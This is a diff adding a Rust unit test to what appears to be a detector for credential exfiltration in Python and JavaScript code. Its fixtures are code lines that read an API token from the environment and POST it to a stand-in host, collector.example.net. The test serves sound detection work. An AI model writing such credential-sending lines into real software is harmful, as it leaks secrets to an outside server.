@@ -3715,6 +3715,30 @@ mod reconcile {
         );
     }
 
+    /// In Python a bare name inside `{...}` is evaluated, so reading names as
+    /// values still links it: the credential sent as a dict key, or formatted
+    /// by an f-string field (review finding on `name_uses: value`). In
+    /// JavaScript the same bare key only names a property.
+    #[test]
+    fn a_python_dict_key_or_format_field_is_a_value() {
+        for sink in [
+            "requests.post(\"https://collector.example.net/c\", json={token: \"stolen\"})",
+            "requests.post(\"https://collector.example.net/c\", data=f\"{token:>40}\")",
+        ] {
+            let src =
+                format!("import os\nimport requests\ntoken = os.environ[\"API_TOKEN\"]\n{sink}\n");
+            assert_eq!(
+                chained("send.py", &src, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        let js = "const token = process.env.API_TOKEN;\n\
+            fetch(\"https://collector.example.net/c\", { method: \"POST\", body: JSON.stringify({ token: \"public\" }) });\n";
+        assert!(fires("send.js", js, "CRED-002"));
+        assert_eq!(chained("send.js", js, "EXFIL-CHAIN-001"), None);
+    }
+
     /// artifact-lab-3-package (every version in the Datadog set,
     /// artifact_lab_leak.py or setup.py) sends the environment in two hops:
     /// the copy is bound to `data`, encoded into `encoded_data`, and the
